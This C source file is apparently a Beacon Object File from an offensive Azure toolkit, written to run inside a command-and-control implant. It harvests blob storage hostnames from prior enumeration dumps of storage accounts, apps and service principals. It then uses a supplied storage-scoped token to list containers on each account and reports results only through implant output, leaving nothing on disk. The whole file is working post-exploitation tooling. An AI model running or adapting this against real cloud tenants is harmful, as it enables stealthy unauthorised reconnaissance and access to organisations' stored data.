/*
 * probe_storage_data_plane.c — BARK BOF
 * Probe-StorageDataPlane — Discover storage accounts from ARM output + app/SP URLs,
 * then probe each account's blob data-plane endpoint (list containers).
 *
 * Discovery sources:
 *   1. AZStorageAccount_*.json — extract "name" field
 *   2. AZApp_*.json / AZServicePrincipal_*.json — scan for .blob.core.windows.net
 *
 * Args : token (storage.azure.com-scoped)
 *
 * Output via BeaconPrintf only — no files written to disk.
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define MAX_HOSTS   64
#define HOST_LEN    256
#define SUFFIX      ".blob.core.windows.net"
#define SUFFIX_LEN  22

static char g_hosts[MAX_HOSTS][HOST_LEN];
static int  g_hostCount = 0;
static int  g_armCount  = 0;
static int  g_appCount  = 0;

static int HostExists(const char *host) {
    int i;
    for (i = 0; i < g_hostCount; i++) {
        if (MSVCRT$strcmp(g_hosts[i], host) == 0)
            return 1;
    }
    return 0;
}

static int AddHost(const char *host) {
    if (g_hostCount >= MAX_HOSTS) return 0;
    if (HostExists(host)) return 0;
    int len = (int)MSVCRT$strlen(host);
    if (len <= 0 || len >= HOST_LEN) return 0;
    MSVCRT$strncpy(g_hosts[g_hostCount], host, HOST_LEN - 1);
    g_hosts[g_hostCount][HOST_LEN - 1] = '\0';
    g_hostCount++;
    return 1;
}

static char *LoadLatestFile(const char *glob) {
    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(glob, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return NULL;

    char bestName[MAX_PATH] = {0};
    MSVCRT$strncpy(bestName, fd.cFileName, MAX_PATH - 1);
    while (KERNEL32$FindNextFileA(hFind, &fd)) {
        if (MSVCRT$strcmp(fd.cFileName, bestName) > 0)
            MSVCRT$strncpy(bestName, fd.cFileName, MAX_PATH - 1);
    }
    KERNEL32$FindClose(hFind);
    if (bestName[0] == '\0') return NULL;

    char fullPath[MAX_PATH + 4];
    MSVCRT$sprintf_s(fullPath, sizeof(fullPath), ".\\%s", bestName);

    HANDLE hf = KERNEL32$CreateFileA(fullPath,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsize = KERNEL32$GetFileSize(hf, NULL);
    if (fsize == INVALID_FILE_SIZE || fsize == 0) {
        KERNEL32$CloseHandle(hf);
        return NULL;
    }
    char *content = (char *)HAlloc(fsize + 1);
    if (!content) { KERNEL32$CloseHandle(hf); return NULL; }

    DWORD nread = 0;
    KERNEL32$ReadFile(hf, content, fsize, &nread, NULL);
    KERNEL32$CloseHandle(hf);
    if (nread == 0) { HFree(content); return NULL; }
    content[nread] = '\0';
    return content;
}

static void DiscoverFromArmOutput(void) {
    char *content = LoadLatestFile(".\\AZStorageAccount_*.json");
    if (!content) return;

    const char *end = content + MSVCRT$strlen(content);
    const char *p = content;

    while (p < end) {
        const char *kindKey = MSVCRT$strstr(p, "\"kind\":\"AZStorageAccount\"");
        if (!kindKey) break;

        const char *dataKey = JsonFindKey(kindKey, end, "\"data\"");
        if (!dataKey) { p = kindKey + 24; continue; }
        const char *dc = JsonFindKey(dataKey, end, ":");
        if (!dc) { p = kindKey + 24; continue; }
        dc++;
        while (dc < end && (*dc == ' ' || *dc == '\t' || *dc == '\n' || *dc == '\r')) dc++;
        if (dc >= end || *dc != '{') { p = kindKey + 24; continue; }
        const char *de = JsonSkipBalanced(dc, end);
        if (!de) { p = kindKey + 24; continue; }

        char *name = JsonExtractStringValue(dc, de, "\"name\"");
        if (name) {
            char hostBuf[HOST_LEN];
            MSVCRT$sprintf_s(hostBuf, sizeof(hostBuf), "%s" SUFFIX, name);
            if (AddHost(hostBuf))
                g_armCount++;
            HFree(name);
        }

        p = de;
    }
    HFree(content);
}

static void ScanFileForSuffix(const char *glob) {
    char *content = LoadLatestFile(glob);
    if (!content) return;

    SIZE_T contentLen = MSVCRT$strlen(content);
    const char *p = content;

    while (1) {
        const char *match = MSVCRT$strstr(p, SUFFIX);
        if (!match) break;

        const char *hostEnd = match + SUFFIX_LEN;
        while (hostEnd < content + contentLen &&
               ((*hostEnd >= 'a' && *hostEnd <= 'z') ||
                (*hostEnd >= 'A' && *hostEnd <= 'Z') ||
                (*hostEnd >= '0' && *hostEnd <= '9') ||
                *hostEnd == '.' || *hostEnd == '-'))
            hostEnd++;

        const char *hostStart = match;
        while (hostStart > content) {
            char c = *(hostStart - 1);
            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                (c >= '0' && c <= '9') || c == '.' || c == '-')
                hostStart--;
            else
                break;
        }

        int hlen = (int)(hostEnd - hostStart);
        if (hlen > 0 && hlen < HOST_LEN && hostStart < match) {
            char hostBuf[HOST_LEN];
            MSVCRT$strncpy(hostBuf, hostStart, (size_t)hlen);
            hostBuf[hlen] = '\0';
            if (AddHost(hostBuf))
                g_appCount++;
        }

        p = hostEnd;
    }
    HFree(content);
}

void go(char *args, int alen)
{
    datap  parser;
    char  *token = NULL;

    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_probe_storage_data_plane <token>\n"
            "    token must be scoped to https://storage.azure.com/\n");
        return;
    }

    g_hostCount = 0;
    g_armCount  = 0;
    g_appCount  = 0;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Probe-StorageDataPlane: discovering storage accounts...\n");

    DiscoverFromArmOutput();
    ScanFileForSuffix(".\\AZApp_*.json");
    ScanFileForSuffix(".\\AZServicePrincipal_*.json");

    if (g_hostCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No storage accounts discovered. Run azurerm/entra enumeration first.\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Discovered %d unique storage account(s) (%d from ARM, %d from apps/SPs)\n",
        g_hostCount, g_armCount, g_appCount);

    LPWSTR hdrWide = BarkMakeAuthHeader(token, "x-ms-version: 2020-10-02\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build auth header\n");
        return;
    }

    int i;
    for (i = 0; i < g_hostCount; i++) {
        const char *source = (i < g_armCount) ? "ARM" : "App/SP";
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Probing storage: %s (source: %s)\n", g_hosts[i], source);

        LPWSTR wideHost = MbsToWcs(g_hosts[i]);
        if (!wideHost) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] %s: host conversion failed\n", g_hosts[i]);
            continue;
        }

        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", wideHost, L"/?comp=list",
            hdrWide, NULL, 0, &status);
        HFree(wideHost);

        if (resp) {
            if (status < 400) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] %s: HTTP %lu\n%s\n", g_hosts[i], (unsigned long)status, resp);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[-] %s: HTTP %lu\n", g_hosts[i], (unsigned long)status);
            }
            HFree(resp);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[-] %s: request failed (HTTP %lu)\n",
                g_hosts[i], (unsigned long)status);
        }
    }

    HFree(hdrWide);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Probed %d storage account(s) (%d from ARM, %d from apps/SPs)\n",
        g_hostCount, g_armCount, g_appCount);
}
